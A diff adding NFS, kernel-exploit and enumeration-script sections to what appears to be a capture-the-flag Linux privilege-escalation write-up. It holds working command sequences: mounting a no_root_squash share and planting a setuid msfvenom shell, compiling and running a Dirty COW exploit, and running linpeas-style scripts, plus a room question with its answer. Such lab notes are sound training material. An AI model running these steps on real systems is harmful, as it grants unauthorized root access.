@@ -738,5 +738,43 @@ ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa r
 
 
 ### NFS
+
+
+cat /etc/exports
+sudo su
+mkdir /tmp/nfs
+
+mount -o rw,vers=3 10.10.197.244:/tmp /tmp/nfs
+
+sudo msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+sudo chmod +xs /tmp/nfs/shell.elf
+
+ls -lh /tmp
+/tmp/shell.elf
+
+1. What is the name of the option that disables root squashing?
+
+   
+   
+   ><details><summary>Click for answer</summary>no_root_squash</details>
+
 ### Kernel Exploits
+
+
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+
+/usr/bin/passwd
+
+mv /tmp/bak /usr/bin/passwd
+exit
+
 ### Privilege Escalation Scripts 
+
+.cd /home/user/tools/privesc-scripts
+
+./LinEnum.sh
+./linpeas.sh
+./lse.sh
